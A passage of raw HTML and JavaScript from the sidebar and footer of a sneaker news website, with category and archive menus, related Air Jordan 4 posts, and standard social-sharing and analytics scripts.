	<option class="level-0" value="285">Customs&nbsp;&nbsp;(1,281)</option>
	<option class="level-0" value="61">DC Shoes&nbsp;&nbsp;(67)</option>
	<option class="level-0" value="3">Dope Kicks&nbsp;&nbsp;(68)</option>
	<option class="level-0" value="11">Dunk&nbsp;&nbsp;(2,765)</option>
	<option class="level-0" value="283">Dwyane Wade&nbsp;&nbsp;(466)</option>
	<option class="level-0" value="205">eBay&nbsp;&nbsp;(2,867)</option>
	<option class="level-0" value="64">Europe Exclusive&nbsp;&nbsp;(343)</option>
	<option class="level-0" value="270">Events&nbsp;&nbsp;(1,071)</option>
	<option class="level-0" value="4625">Featured&nbsp;&nbsp;(2,420)</option>
	<option class="level-0" value="7337">Featured Stories&nbsp;&nbsp;(290)</option>
	<option class="level-0" value="50">Finishline&nbsp;&nbsp;(360)</option>
	<option class="level-0" value="48">Footscape&nbsp;&nbsp;(169)</option>
	<option class="level-0" value="35">Gear&nbsp;&nbsp;(138)</option>
	<option class="level-0" value="284">Giveaway&nbsp;&nbsp;(42)</option>
	<option class="level-0" value="287">Griffey&nbsp;&nbsp;(209)</option>
	<option class="level-0" value="207">House of Hoops&nbsp;&nbsp;(301)</option>
	<option class="level-0" value="34">Hybrid&nbsp;&nbsp;(1,360)</option>
	<option class="level-0" value="73">Hyperdunk&nbsp;&nbsp;(736)</option>
	<option class="level-0" value="29">Japanese Brands&nbsp;&nbsp;(537)</option>
	<option class="level-0" value="204">JD Sports&nbsp;&nbsp;(243)</option>
	<option class="level-0" value="1">Just Released&nbsp;&nbsp;(13,804)</option>
	<option class="level-0" value="282">Kevin Durant&nbsp;&nbsp;(1,450)</option>
	<option class="level-0" value="52">Kids&nbsp;&nbsp;(608)</option>
	<option class="level-0" value="209">Kobe&nbsp;&nbsp;(2,089)</option>
	<option class="level-0" value="1282">Kyrie Irving&nbsp;&nbsp;(30)</option>
	<option class="level-0" value="22">LeBron&nbsp;&nbsp;(3,326)</option>
	<option class="level-0" value="217">Lifestyle Sneakers&nbsp;&nbsp;(2,992)</option>
	<option class="level-0" value="28">New Balance&nbsp;&nbsp;(1,450)</option>
	<option class="level-0" value="63">Nike 6.0&nbsp;&nbsp;(114)</option>
	<option class="level-0" value="71">Nike ACG&nbsp;&nbsp;(493)</option>
	<option class="level-0" value="7">Nike Air Force 1s&nbsp;&nbsp;(2,914)</option>
	<option class="level-0" value="5">Nike Air Max&nbsp;&nbsp;(5,028)</option>
	<option class="level-0" value="288">Nike Air Penny&nbsp;&nbsp;(680)</option>
	<option class="level-0" value="90">Nike Boots&nbsp;&nbsp;(253)</option>
	<option class="level-0" value="3101">Nike Flyknit&nbsp;&nbsp;(428)</option>
	<option class="level-0" value="280">Nike Foamposite&nbsp;&nbsp;(1,339)</option>
	<option class="level-0" value="51">Nike Force&nbsp;&nbsp;(138)</option>
	<option class="level-0" value="208">Nike Free&nbsp;&nbsp;(815)</option>
	<option class="level-0" value="6974">Nike Huarache&nbsp;&nbsp;(352)</option>
	<option class="level-0" value="40">Nike iD&nbsp;&nbsp;(944)</option>
	<option class="level-0" value="286">Nike Lunar&nbsp;&nbsp;(1,111)</option>
	<option class="level-0" value="58">Nike Retro&nbsp;&nbsp;(3,529)</option>
	<option class="level-0" value="5781">Nike Roshe&nbsp;&nbsp;(503)</option>
	<option class="level-0" value="10">Nike SB&nbsp;&nbsp;(2,841)</option>
	<option class="level-0" value="36">NikeStore&nbsp;&nbsp;(717)</option>
	<option class="level-0" value="56">P-Rod&nbsp;&nbsp;(290)</option>
	<option class="level-0" value="23">PE&nbsp;&nbsp;(2,478)</option>
	<option class="level-0" value="31">Promo&nbsp;&nbsp;(682)</option>
	<option class="level-0" value="62">Puma&nbsp;&nbsp;(646)</option>
	<option class="level-0" value="49">Reebok&nbsp;&nbsp;(2,006)</option>
	<option class="level-0" value="6300">Release Dates&nbsp;&nbsp;(715)</option>
	<option class="level-0" value="38">Running&nbsp;&nbsp;(3,637)</option>
	<option class="level-0" value="8">Sample&nbsp;&nbsp;(1,637)</option>
	<option class="level-0" value="535">Saucony&nbsp;&nbsp;(283)</option>
	<option class="level-0" value="6021">Select&nbsp;&nbsp;(106)</option>
	<option class="level-0" value="30">Shoes&nbsp;&nbsp;(63)</option>
	<option class="level-0" value="69">Skate&nbsp;&nbsp;(3,235)</option>
	<option class="level-0" value="162">Supra&nbsp;&nbsp;(537)</option>
	<option class="level-0" value="215">Terminator&nbsp;&nbsp;(143)</option>
	<option class="level-0" value="4132">Top Categories&nbsp;&nbsp;(1)</option>
	<option class="level-0" value="14">Toys&nbsp;&nbsp;(39)</option>
	<option class="level-0" value="33">Trainer&nbsp;&nbsp;(1,547)</option>
	<option class="level-0" value="66">Upcoming Sneakers&nbsp;&nbsp;(23,149)</option>
	<option class="level-0" value="53">Vandal&nbsp;&nbsp;(104)</option>
	<option class="level-0" value="32">Vans&nbsp;&nbsp;(1,459)</option>
	<option class="level-0" value="37">Vintage&nbsp;&nbsp;(573)</option>
	<option class="level-0" value="82">Visvim&nbsp;&nbsp;(40)</option>
	<option class="level-0" value="279">Weekly Rewind&nbsp;&nbsp;(264)</option>
	<option class="level-0" value="26">WMNS&nbsp;&nbsp;(1,602)</option>
</select>
<script type='text/javascript'>
/* <![CDATA[ */
            var ec_dropdown_top_2 = document.getElementById("cat");
            function ec_top_onCatChange_2() {
                if ( ec_dropdown_top_2.options[ec_dropdown_top_2.selectedIndex].value > 0 ) {
                    location.href = "http://sneakernews.com/?cat="+ec_dropdown_top_2.options[ec_dropdown_top_2.selectedIndex].value;
                }
            }
            ec_dropdown_top_2.onchange = ec_top_onCatChange_2;
/* ]]> */
</script>
</div>	<li class="cat-item cat-item-1"><a href="http://sneakernews.com/category/just-released/" >Just Released</a>
</li>
	<li class="cat-item cat-item-5"><a href="http://sneakernews.com/category/air-max/" >Nike Air Max</a>
</li>
	<li class="cat-item cat-item-7"><a href="http://sneakernews.com/category/air-force-1/" >Nike Air Force 1s</a>
</li>
	<li class="cat-item cat-item-10"><a href="http://sneakernews.com/category/nike-sb/" >Nike SB</a>
</li>
	<li class="cat-item cat-item-11"><a href="http://sneakernews.com/category/dunk/" >Dunk</a>
</li>
	<li class="cat-item cat-item-12"><a href="http://sneakernews.com/category/air-jordan/" >Air Jordan</a>
</li>
	<li class="cat-item cat-item-21"><a href="http://sneakernews.com/category/basketball/" >Basketball</a>
</li>
	<li class="cat-item cat-item-22"><a href="http://sneakernews.com/category/lebron/" >LeBron</a>
</li>
	<li class="cat-item cat-item-24"><a href="http://sneakernews.com/category/adidas/" >Adidas</a>
</li>
	<li class="cat-item cat-item-38"><a href="http://sneakernews.com/category/running/" >Running</a>
</li>
	<li class="cat-item cat-item-43"><a href="http://sneakernews.com/category/collaboration/" >Collaboration</a>
</li>
	<li class="cat-item cat-item-58"><a href="http://sneakernews.com/category/nike-retro/" >Nike Retro</a>
</li>
	<li class="cat-item cat-item-66"><a href="http://sneakernews.com/category/upcoming-sneakers/" >Upcoming Sneakers</a>
</li>
	<li class="cat-item cat-item-69"><a href="http://sneakernews.com/category/skate/" >Skate</a>
</li>
	<li class="cat-item cat-item-205"><a href="http://sneakernews.com/category/ebay/" >eBay</a>
</li>
	<li class="cat-item cat-item-217"><a href="http://sneakernews.com/category/lifestyle-sneakers/" >Lifestyle Sneakers</a>
</li>
</ul>    </section>

    <section class="right-data-con">
        <h3><span>Archives</span></h3><div class="cat-drop">		<select name="archive-dropdown" onchange='document.location.href=this.options[this.selectedIndex].value;'>
			<option value="">Select Month</option>

				<option value='http://sneakernews.com/2015/01/'> January 2015 </option>
	<option value='http://sneakernews.com/2014/12/'> December 2014 </option>
	<option value='http://sneakernews.com/2014/11/'> November 2014 </option>
	<option value='http://sneakernews.com/2014/10/'> October 2014 </option>
	<option value='http://sneakernews.com/2014/09/'> September 2014 </option>
	<option value='http://sneakernews.com/2014/08/'> August 2014 </option>
	<option value='http://sneakernews.com/2014/07/'> July 2014 </option>
	<option value='http://sneakernews.com/2014/06/'> June 2014 </option>
	<option value='http://sneakernews.com/2014/05/'> May 2014 </option>
	<option value='http://sneakernews.com/2014/04/'> April 2014 </option>
	<option value='http://sneakernews.com/2014/03/'> March 2014 </option>
	<option value='http://sneakernews.com/2014/02/'> February 2014 </option>
	<option value='http://sneakernews.com/2014/01/'> January 2014 </option>
	<option value='http://sneakernews.com/2013/12/'> December 2013 </option>
	<option value='http://sneakernews.com/2013/11/'> November 2013 </option>
	<option value='http://sneakernews.com/2013/10/'> October 2013 </option>
	<option value='http://sneakernews.com/2013/09/'> September 2013 </option>
	<option value='http://sneakernews.com/2013/08/'> August 2013 </option>
	<option value='http://sneakernews.com/2013/07/'> July 2013 </option>
	<option value='http://sneakernews.com/2013/06/'> June 2013 </option>
	<option value='http://sneakernews.com/2013/05/'> May 2013 </option>
	<option value='http://sneakernews.com/2013/04/'> April 2013 </option>
	<option value='http://sneakernews.com/2013/03/'> March 2013 </option>
	<option value='http://sneakernews.com/2013/02/'> February 2013 </option>
	<option value='http://sneakernews.com/2013/01/'> January 2013 </option>
	<option value='http://sneakernews.com/2012/12/'> December 2012 </option>
	<option value='http://sneakernews.com/2012/11/'> November 2012 </option>
	<option value='http://sneakernews.com/2012/10/'> October 2012 </option>
	<option value='http://sneakernews.com/2012/09/'> September 2012 </option>
	<option value='http://sneakernews.com/2012/08/'> August 2012 </option>
	<option value='http://sneakernews.com/2012/07/'> July 2012 </option>
	<option value='http://sneakernews.com/2012/06/'> June 2012 </option>
	<option value='http://sneakernews.com/2012/05/'> May 2012 </option>
	<option value='http://sneakernews.com/2012/04/'> April 2012 </option>
	<option value='http://sneakernews.com/2012/03/'> March 2012 </option>
	<option value='http://sneakernews.com/2012/02/'> February 2012 </option>
	<option value='http://sneakernews.com/2012/01/'> January 2012 </option>
	<option value='http://sneakernews.com/2011/12/'> December 2011 </option>
	<option value='http://sneakernews.com/2011/11/'> November 2011 </option>
	<option value='http://sneakernews.com/2011/10/'> October 2011 </option>
	<option value='http://sneakernews.com/2011/09/'> September 2011 </option>
	<option value='http://sneakernews.com/2011/08/'> August 2011 </option>
	<option value='http://sneakernews.com/2011/07/'> July 2011 </option>
	<option value='http://sneakernews.com/2011/06/'> June 2011 </option>
	<option value='http://sneakernews.com/2011/05/'> May 2011 </option>
	<option value='http://sneakernews.com/2011/04/'> April 2011 </option>
	<option value='http://sneakernews.com/2011/03/'> March 2011 </option>
	<option value='http://sneakernews.com/2011/02/'> February 2011 </option>
	<option value='http://sneakernews.com/2011/01/'> January 2011 </option>
	<option value='http://sneakernews.com/2010/12/'> December 2010 </option>
	<option value='http://sneakernews.com/2010/11/'> November 2010 </option>
	<option value='http://sneakernews.com/2010/10/'> October 2010 </option>
	<option value='http://sneakernews.com/2010/09/'> September 2010 </option>
	<option value='http://sneakernews.com/2010/08/'> August 2010 </option>
	<option value='http://sneakernews.com/2010/07/'> July 2010 </option>
	<option value='http://sneakernews.com/2010/06/'> June 2010 </option>
	<option value='http://sneakernews.com/2010/05/'> May 2010 </option>
	<option value='http://sneakernews.com/2010/04/'> April 2010 </option>
	<option value='http://sneakernews.com/2010/03/'> March 2010 </option>
	<option value='http://sneakernews.com/2010/02/'> February 2010 </option>
	<option value='http://sneakernews.com/2010/01/'> January 2010 </option>
	<option value='http://sneakernews.com/2009/12/'> December 2009 </option>
	<option value='http://sneakernews.com/2009/11/'> November 2009 </option>
	<option value='http://sneakernews.com/2009/10/'> October 2009 </option>
	<option value='http://sneakernews.com/2009/09/'> September 2009 </option>
	<option value='http://sneakernews.com/2009/08/'> August 2009 </option>
	<option value='http://sneakernews.com/2009/07/'> July 2009 </option>
	<option value='http://sneakernews.com/2009/06/'> June 2009 </option>
	<option value='http://sneakernews.com/2009/05/'> May 2009 </option>
	<option value='http://sneakernews.com/2009/04/'> April 2009 </option>
	<option value='http://sneakernews.com/2009/03/'> March 2009 </option>
	<option value='http://sneakernews.com/2009/02/'> February 2009 </option>
	<option value='http://sneakernews.com/2009/01/'> January 2009 </option>
	<option value='http://sneakernews.com/2008/12/'> December 2008 </option>
	<option value='http://sneakernews.com/2008/11/'> November 2008 </option>
	<option value='http://sneakernews.com/2008/10/'> October 2008 </option>
	<option value='http://sneakernews.com/2008/09/'> September 2008 </option>
	<option value='http://sneakernews.com/2008/08/'> August 2008 </option>
	<option value='http://sneakernews.com/2008/07/'> July 2008 </option>
	<option value='http://sneakernews.com/2008/06/'> June 2008 </option>
	<option value='http://sneakernews.com/2008/05/'> May 2008 </option>
	<option value='http://sneakernews.com/2008/04/'> April 2008 </option>
	<option value='http://sneakernews.com/2008/03/'> March 2008 </option>
	<option value='http://sneakernews.com/2008/02/'> February 2008 </option>
	<option value='http://sneakernews.com/2008/01/'> January 2008 </option>
	<option value='http://sneakernews.com/2007/12/'> December 2007 </option>
	<option value='http://sneakernews.com/2007/11/'> November 2007 </option>
	<option value='http://sneakernews.com/2007/10/'> October 2007 </option>
	<option value='http://sneakernews.com/2007/09/'> September 2007 </option>
	<option value='http://sneakernews.com/2007/08/'> August 2007 </option>
	<option value='http://sneakernews.com/2007/07/'> July 2007 </option>
	<option value='http://sneakernews.com/2007/06/'> June 2007 </option>
	<option value='http://sneakernews.com/2007/05/'> May 2007 </option>
	<option value='http://sneakernews.com/2007/04/'> April 2007 </option>
	<option value='http://sneakernews.com/2007/03/'> March 2007 </option>
	<option value='http://sneakernews.com/2007/02/'> February 2007 </option>
	<option value='http://sneakernews.com/2007/01/'> January 2007 </option>
	<option value='http://sneakernews.com/2006/12/'> December 2006 </option>
		</select>
</div>    </section>

    <section class="right-data-con featured-content">
        <h3><span>Featured Content</span></h3>			<div class="textwidget"><div class="featured-content-sidebar">


<a href="http://sneakernews.com/air-jordan-brand-jordan/"><img src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/snkrnws_banner_historyaj.jpg"></a>
<br>

<a href="http://sneakernews.com/nike-sb-skateboarding/"><img src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/snkrnws_banner_nikesbarchive.jpg"></a>
<br>

<a href="http://sneakernews.com/magazine/"><img src="http://cdn.sneakernews.com/wp-content/uploads/2014/11/SNMAG-300x250.jpg"></a>
</div><br>



</div>
		    </section>

    <section class="right-data-con news-letter">
        <h3><span>Sneaker News Newsletter</span></h3>			<div class="textwidget"><div class="e-mail">
	        <form method="post" target="_blank" action="http://visitor.r20.constantcontact.com/d.jsp" name="ccoptin">
				<input class="newslatterclass" type="text" name="ea" size="35" value="Enter Email To Sign Up" onBlur="if(this.value=='') this.value='Enter Email To Sign Up'" onFocus="if(this.value =='Enter Email To Sign Up' ) this.value=''">
				<input type="submit" class="submit" value="Sign Up" name="signup">
				<input type="hidden" value="dcdlvybab" name="llr">
				<input type="hidden" value="1101413059651" name="m">
				<input type="hidden" value="oi" name="p">
			</form>                     	
		</div></div>
		    </section>
    				<section class="right-data-con ">
					<h3><span>Related posts</span></h3>
											<div class="recent-posts releted-post-image">
							<div class="post-img">
								<a href="http://sneakernews.com/2015/01/02/2015-remastered-jordans-arrive-next-saturday/">
									<img src="http://cdn.sneakernews.com/wp-content/uploads/2015/01/air-jordan-4-columbia-remastered-release-2.jpg" alt="" />
								</a>
							</div>
							<div class="post-text">
								<p>
									<strong><a href="http://sneakernews.com/2015/01/02/2015-remastered-jordans-arrive-next-saturday/">The 2015 Remastered Jordans Arrive Next Saturday</a></strong>
									<span>by <a href="http://sneakernews.com/author/John Kim"> John Kim</a></span>
									<i>
									22 Comments</i>
								</p>
							</div>
						</div>
												<div class="recent-posts releted-post-image">
							<div class="post-img">
								<a href="http://sneakernews.com/2014/12/31/air-jordan-4-suede-python-jbf-customs/">
									<img src="http://cdn.sneakernews.com/wp-content/uploads/2014/12/air-jordan-iv-bred-suede-python-jbf-customs-2.jpg" alt="" />
								</a>
							</div>
							<div class="post-text">
								<p>
									<strong><a href="http://sneakernews.com/2014/12/31/air-jordan-4-suede-python-jbf-customs/">Air Jordan 4 &#8220;Suede Python&#8221; by JBF Customs</a></strong>
									<span>by <a href="http://sneakernews.com/author/John Kim"> John Kim</a></span>
									<i>
									8 Comments</i>
								</p>
							</div>
						</div>
												<div class="recent-posts releted-post-image">
							<div class="post-img">
								<a href="http://sneakernews.com/2014/12/29/air-jordan-4-columbia-arriving-retailers/">
									<img src="http://cdn.sneakernews.com/wp-content/uploads/2014/12/jordan-4-columbia-shoes-2.jpg" alt="" />
								</a>
							</div>
							<div class="post-text">
								<p>
									<strong><a href="http://sneakernews.com/2014/12/29/air-jordan-4-columbia-arriving-retailers/">Air Jordan 4 &#8220;Columbia&#8221; &#8211; Arriving at Retailers</a></strong>
									<span>by <a href="http://sneakernews.com/author/Zack Schlemmer"> Zack Schlemmer</a></span>
									<i>
									68 Comments</i>
								</p>
							</div>
						</div>
												<div class="recent-posts releted-post-image">
							<div class="post-img">
								<a href="http://sneakernews.com/2014/12/21/air-jordan-4-columbia-remastered-price-185/">
									<img src="http://cdn.sneakernews.com/wp-content/uploads/2014/12/remastered-jordan-4-legend-blue.jpg" alt="" />
								</a>
							</div>
							<div class="post-text">
								<p>
									<strong><a href="http://sneakernews.com/2014/12/21/air-jordan-4-columbia-remastered-price-185/">Air Jordan 4 &#8220;Columbia&#8221; Remastered Price is $185</a></strong>
									<span>by <a href="http://sneakernews.com/author/John Kim"> John Kim</a></span>
									<i>
									141 Comments</i>
								</p>
							</div>
						</div>
												<div class="recent-posts releted-post-image">
							<div class="post-img">
								<a href="http://sneakernews.com/2014/12/18/air-jordan-4-gs-fuschia-release-date/">
									<img src="http://cdn.sneakernews.com/wp-content/uploads/2014/12/air-jordan-4-gs-fuschia-release-date-01-620x415.jpg" alt="" />
								</a>
							</div>
							<div class="post-text">
								<p>
									<strong><a href="http://sneakernews.com/2014/12/18/air-jordan-4-gs-fuschia-release-date/">Air Jordan 4 GS &#8220;Fuschia&#8221; &#8211; Release Date</a></strong>
									<span>by <a href="http://sneakernews.com/author/Patrick Johnson"> Patrick Johnson</a></span>
									<i>
									34 Comments</i>
								</p>
							</div>
						</div>
						</section>
    
    	
    	    
    
    

</div>            <!--side-bar-->
        </div><!-- detail-con-main -->
    </div><!-- #detail-page-container -->
</div><!-- #wrapper -->


</div>
<!-- end cmn_wrap -->
<footer id="colophon" role="contentinfo">
    <div class="wrapper">
        <div class="footer-main">
            <div class="footer-left">
                <div class="footer-top">
                    <a class="footerlogo" href="http://sneakernews.com"><img src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/sneakernews-logo-one-line.png " alt="Sneaker News" /></a>
                    <ul class="social-link">
                        <li><a class="facebook" href="https://www.facebook.com/sneakernews"></a></li>                        <li><a class="instagram" href="http://instagram.com/sneakernews"></a></li>                        <li><a class="twitter" href="https://twitter.com/sneakernews/"></a></li><li><a class="pinterest" href="http://pinterest.com/sneakernews/"></a></li><li><a class="google" href="https://plus.google.com/+sneakernews/about"></a></li>                    </ul>
                </div>
                <div class="footer-text">
                    <p>
                    © 2006-2014 Liquidrice, Inc. | Sneaker News is a Liquidrice, Inc. Company</p>
                </div>
            </div>
            <div class="footer-right">
                <ul class="footer-menu">
<div class="menu-footer-menu-container"><li id="menu-item-550283" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-550283"><a href="http://sneakernews.com/about/">About Us</a></li>
<li id="menu-item-550284" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550284"><a href="http://sneakernews.com/jobs/">career</a></li>
<li id="menu-item-550285" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550285"><a href="http://sneakernews.com/advertise/">advertise</a></li>
<li id="menu-item-550286" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550286"><a href="http://sneakernews.com/about/#sneaker-news-staff">staff</a></li>
<li id="menu-item-550287" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-550287"><a href="http://sneakernews.com/contact/">Contact</a></li>
</div>                </ul>
            </div>

            <div class="footer-for-mobile">
                <div class="mob-soc-icon">
                    <ul class="social-link">
                        <li><a class="facebook" href="https://www.facebook.com/sneakernews"></a></li><li><a class="instagram" href="http://instagram.com/sneakernews"></a></li>                                                                                <li><a class="twitter" href="https://twitter.com/sneakernews/"></a></li>                                                                                <li><a class="pinterest" href="http://pinterest.com/sneakernews/"></a></li>                                                                                <li><a class="google" href="https://plus.google.com/+sneakernews/about"></a></li>                    </ul>
                    <a class="footerlogo" href="http://sneakernews.com"><img src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/sneakernews-logo-one-line.png " alt="Sneaker News" /></a>
                    <p><span>© 2006-2014 Liquidrice, Inc. | Sneaker News is a Liquidrice, Inc. Company</span></p>
                </div>
            </div>

        </div>
    </div>
</footer><!-- #colophon -->
</div><!--main-->
	<script type="text/javascript">
		//livefire comment count  functionality
		
		var _md = jQuery.noConflict();		
	    _md("document").ready(function(){
	    	
	    	function set_comment_count_fun(){
		    	//var new_comment_count = _md('.fyre .fyre-stream-stats span').text().replace(/ /g,'');
				var new_comment_count = _md('.fyre .fyre-stream-stats .fyre-comment-count span').text();
				if('' != new_comment_count ){
					new_comment_count = new_comment_count.slice(0,-8);
					new_comment_count = new_comment_count.replace('/[A-Za-z$-]/g','');
					var old_comment_count = _md('b.comment').text();
			    	if( old_comment_count.replace(/\s/g, '') != new_comment_count.replace(/\s/g, '')) {					
			    		add_comment_count(new_comment_count);			    		
			    	}
				}
		    }
		    
		    function add_comment_count(comment_counts){		      
		     var formData = { post_url:window.location.href,comment_count:comment_counts };	    	  
		     var my_url = "http://sneakernews.com/wp-content/themes/sneakernews/lifefire-comment-count.php";
		        $.ajax({
		            type: 'POST',
		            url: my_url,
		            data: formData,		            
		            success: function(comment_opdate) {
		               //$(this).find('#shares-like strong').text(share_count_data);		              
		           }
		    	});
		    }		    	    	
	    	setTimeout(set_comment_count_fun, 5000);    
	    });		
	</script>

<script type="text/javascript">
	function add_digit_share_counts(get_page_url, social_call) {
        var formData = {page_url: get_page_url};        
        var my_url = "http://sneakernews.com/wp-content/themes/sneakernews/share_count_api.php";
        $.ajax({
            type: 'POST',
            url: my_url,
            data: formData,
            success: function(share_count_data) {
                //$(this).find('#shares-like strong').text(share_count_data);
               // alert(1);
            }
        });
    }
    var _rys = jQuery.noConflict();
    var margin_top = _rys("#sneaker-news-main nav ul").height();
    var top_div_hight = _rys("#sneaker-news-main .logo-main").height();
	var add_dynamic_hight = _rys("#cmn_ad_tag_head").height();
    _rys("document").ready(function() {
        var browsername = $.browser.mozilla;
        _rys(window).scroll(function() {
            add_dynamic_hight = _rys("#cmn_ad_tag_head").height();
			margin_top = _rys("#sneaker-news-main nav ul").height();			
            top_div_hight = _rys("#sneaker-news-main .logo-main").height() + add_dynamic_hight;

            if (_rys(this).scrollTop() > top_div_hight) {
                _rys('.sneaker-nav').addClass("blue-nav");
                _rys('#sneaker-news-main .sub-nav-main').css('margin-top', margin_top);

            } else {
                _rys('.sneaker-nav').removeClass("blue-nav");
                _rys('#sneaker-news-main .sub-nav-main').css('margin-top', 0);
            }

            if (browsername == true) {
                if (_rys(this).scrollTop() > 600) {
                    _rys('#sneaker-news-main .sub-nav-main').css('margin-top', 0);
                }
            }
        });
        _rys('.rating-img img').hover(function() {
            if (!($(this).hasClass('after_rating_img'))) {
                _rys(this).parent().find('i').show();
            }
        }, function() {
            _rys(this).parent().find('i').hide();
        }); 
        
        //_rys('#detail-page-container .detail-con-main .detail-wide-main .product-detail-main .date-and-name p b.comment').text(_rys('.fyre .fyre-stream-stats span').text().slice(0,-8));
       	
       
    });

</script>

<script>(function(d, s, id) {
        var js, fjs = d.getElementsByTagName(s)[0];
        if (d.getElementById(id))
            return;
        js = d.createElement(s);
        js.id = id;
        js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&appId=705752536169784&version=v2.0";
        fjs.parentNode.insertBefore(js, fjs);
    }(document, 'script', 'facebook-jssdk'));

    window.fbAsyncInit = function() {
        FB.Event.subscribe('edge.create', function(response) {
            add_digit_share_counts(response, 'FB');
        });
        FB.Event.subscribe('edge.remove', function(href, widget) {
            add_digit_share_counts(href, 'FB');
        });
    };

    function googlePlusCallback(jsonParam) {
        var plusOneUrl = jsonParam.href;
        add_digit_share_counts(plusOneUrl, 'gooleplus');

    }
    function reward_user(event) {
        if (event) {
            var temp_array = event.target.src.split('&').reverse();
            var get_url = '';
            var re_jem = /%3A/g;
            var re_slash = /%2F/g;

            for (index = 0; index < temp_array.length; ++index) {
                var check_string = temp_array[index];
                if ('url=' == check_string.substring(0, 4)) {
                    get_url = temp_array[index].substring(4, temp_array[index].length);
                    break;
                }
            }
            get_url = get_url.replace(re_jem, ':');
            get_url = get_url.replace(re_slash, "/");

            add_digit_share_counts(get_url, 'TWEET');

        }
    }
    window.twttr = (function(d, s, id) {
        var t, js, fjs = d.getElementsByTagName(s)[0];
        if (d.getElementById(id)) {
            return
        }
        js = d.createElement(s);
        js.id = id;
        js.src = "https://platform.twitter.com/widgets.js";
        fjs.parentNode.insertBefore(js, fjs);
        return window.twttr || (t = {_e: [], ready: function(f) {
                t._e.push(f)
            }})
    }(document, "script", "twitter-wjs"));

    twttr.ready(function(twttr) {
        twttr.events.bind('tweet', reward_user);
    });
    
    jQuery(function($) {
    	
		jQuery('body').on('click', 'a[data-pin-log="button_pinit"]', function(event) {
           // alert($(this).closest('.post-header').find('.header-title a').attr("href"));            
            var pingrest_url = $(this).closest('.post-header').find('.header-title a').attr("href");
            if( typeof pingrest_url === "undefined" ) {
            	pingrest_url = window.location.href;                     
            }
			add_digit_share_counts(pingrest_url, 'TWEET');
     	});
    
        $('.social_box').on("touchstart", function (e) {
		    "use strict"; //satisfy the code inspectors
		    var link = $(this); //preselect the link
		    if ($(window).width() <= 1024 && navigator.userAgent.match(/(iPod|iPhone|iPad)/)) {
			    if (link.hasClass('hover')) {
			        return true;
			    } else {
			        link.addClass("hover");
			        $('.social_box').not(this).removeClass("hover");
			        e.preventDefault();
			        return false; //extra, and to make sure the function has consistent return points
			    }
		    }
		});
    });
</script>

<script type="text/javascript">var lf_config = [{"collectionMeta":"eyJ0eXAiOiJqd3QiLCJhbGciOiJIUzI1NiJ9.eyJ0aXRsZSI6IkFpciBKb3JkYW4gNCAmIzgyMjA7Q29sdW1iaWEmIzgyMjE7IFJldHJvIFJldHVybmluZyBpbiAyMDE1IiwidXJsIjoiaHR0cDpcL1wvc25lYWtlcm5ld3MuY29tXC8yMDE0XC8wNlwvMDRcL2Fpci1qb3JkYW4tNC1jb2x1bWJpYS1yZXRyby1yZXR1cm5pbmctMjAxNVwvIiwidGFncyI6WyJBaXIgSm9yZGFuICg0KSBJViIsIkFpciBKb3JkYW4gNCIsIkFpciBKb3JkYW4gNCBDb2x1bWJpYSIsIkFpciBKb3JkYW4gSVYgQ29sdW1iaWEiXSwiY2hlY2tzdW0iOiIzMmY1ZGM3MjE1NDdmMjQxMzk4OWIwZmVkYTM5ODFlMCIsImFydGljbGVJZCI6NTE3OTcxfQ.sVO8bcd-jWS3xsx2ZLclQsGiniC_TVl_DKxqVc3ZJqY","checksum":"32f5dc721547f2413989b0feda3981e0","siteId":"307153","articleId":517971,"strings":"","el":"livefyre-comments"}];var conv = fyre.conv.load({}, lf_config);</script>
            <!-- LF DEBUG
            site-id: 307153
            article-id: 517971
            post-type: post
            comments-open: true
            is-single: true
            display-posts: true
            display-pages: true
            -->
        	<div style="display:none">
	</div>

	<script src="http://stats.wordpress.com/e-201501.js" type="text/javascript"></script>
	<script type="text/javascript">
	st_go({v:'ext',j:'1:2.6.3',blog:'30110943',post:'517971',tz:'-5'});
	var load_cmc = function(){linktracker_init(30110943,517971,2);};
	if ( typeof addLoadEvent != 'undefined' ) addLoadEvent(load_cmc);
	else load_cmc();
	</script>


<!-- Quantcast Tag --> 
<script type="text/javascript">
  var _qevents = _qevents || [];

  (function() {
   var elem = document.createElement('script');

   elem.src = (document.location.protocol == "https:" ? "https://secure" : "http://edge") + ".quantserve.com/quant.js";
   elem.async = true;
   elem.type = "text/javascript";
   var scpt = document.getElementsByTagName('script')[0];
   scpt.parentNode.insertBefore(elem, scpt);  
  })();
</script>
<script type="text/javascript">
_qevents.push( { qacct:"p-a0gOdUACucKCE"} );
</script>
<noscript>
<div style="display: none;"><img src="//pixel.quantserve.com/pixel/p-a0gOdUACucKCE.gif" height="1" width="1" alt="Quantcast"/></div>
</noscript>
<!-- End Quantcast tag -->



<!-- cmnUNT | Begin footer script -->
<script type="text/javascript">            
    cmnTB();                // Toolbar
    cmnUNT('tover', tile_num++);        // Wallpaper Takeover
</script>

<!-- Begin comScore Tag -->
<script>document.write(unescape("%3Cscript src='" + (document.location.protocol == "https:" ? "https://sb" : "http://b") + ".scorecardresearch.com/beacon.js' %3E%3C/script%3E"));</script>
<script>
  COMSCORE.beacon({
    c1:2,
    c2:6685975,
    c3:"",
    c4:"www.sneakernews.com/",
    c5:"",
    c6:"",
    c15:""
  });
</script>

<script type="text/javascript">

function showCommentCount() { 
    jQuery('.custom_comment').each(function(){
	var span_text = jQuery(this).text();
        var ahtml = ""+jQuery(this).find('a').html()+"";
	var start = (span_text + '').indexOf('(', 0) + 1;
	var end = (span_text + '').indexOf(')', 0) - start;
	//alert(span_text.substr(start,end));
    ahtml = span_text.substr(start,end);
    //ahtml = ahtml.substr(10, ahtml.length - 11);
	jQuery(this).html(ahtml);

});

jQuery('.custom_comment').show();
}
</script>
<script type="text/javascript">
(function($){
jQuery(document).ready(function () {   	
setTimeout(showCommentCount, 6000);

}); 
})(jQuery);
</script>
<noscript><img src="http://b.scorecardresearch.com/p?c1=2&c2=6685975&c3=&c4=&c5=&c6=&c15=&cj=1" /></noscript>
<!-- End comScore Tag -->

<script type="text/javascript">
  (function() {
    var elem = document.createElement('script');
